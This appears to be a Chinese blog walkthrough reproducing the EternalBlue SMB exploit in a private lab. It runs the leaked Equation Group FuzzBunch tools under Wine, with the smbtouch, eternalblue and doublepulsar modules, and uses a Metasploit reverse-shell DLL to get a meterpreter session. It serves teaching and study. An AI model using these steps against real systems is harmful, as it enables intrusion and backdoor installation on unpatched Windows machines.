---
layout:     post
title:      Eternalblue漏洞复现
author:     wooy0ung
tags: 		windows
category:  	exploit
---

- 目录
{:toc #markdown-toc}

>利用环境:  
>攻击机：192.168.2.63		Mac OSX 10.12.5  
>靶机：192.168.2.64		Windows 7 x64  
<!-- more -->


### 0x00 攻击环境搭建

安装wine

```
$ brew install wine
$ winecfg
// 将 export WINEDEBUG=-all 添加到 .bash_profile
$ source ./.bash_profile
```

安装python2.6.6，我这里已经安装过了

```
$ wine msiexec /i python-2.6.6.msi
```

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x00.png)

安装pywin32-2.6，也已经安装过了，注意python和pywin都是32位，否则会报错

```
$ wine pywin32-221.win32-py2.6.exe
```

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x01.png)

添加python环境变量，打开HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Enviroment，把 C:\Python26 添加到PATH的value

```
$ regedit
```

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x02.png)

在~/.wine/drive_c新建eqgrp目录，解压EQGRP_Lost_in_Translation.zip，把解压后的windows目录放到新建的eqgrp，在C:\eqgrp\windows新建listeningposts目录

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x03.png)

启动fb.py，按照提示进行设置即可

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x04.png)


### 0x01 目标信息搜集

扫一下IP以及端口，发现目标机器开放445端口

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x05.png)


先touch一下看目标系统是否存在漏洞，这里发现存在eternalblue可利用

```
> use smbtouch
> execute
```

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x06.png)


### 0x02 漏洞复现

除了以下几个地方，其余全部默认设置

```
> use eternalblue
```

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x07.png)

利用脚本执行完成，根据返回信息获得目标系统架构 x64

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x08.png)

先把当前目录切换到 ~/.wine/drive_c，用msf生成反向连接的dll

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x09.png)

启动msf，等待反向接入

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x0a.png)

安装反连dll后门，除了以下几个地方，其余都按默认设置

```
> use doublepulsar
```

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x0b.png)

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x0c.png)

成功拿到meterpreter会话

![](/assets/img/exploit/2017-06-17-windows-smb-eternalblue/0x0d.png)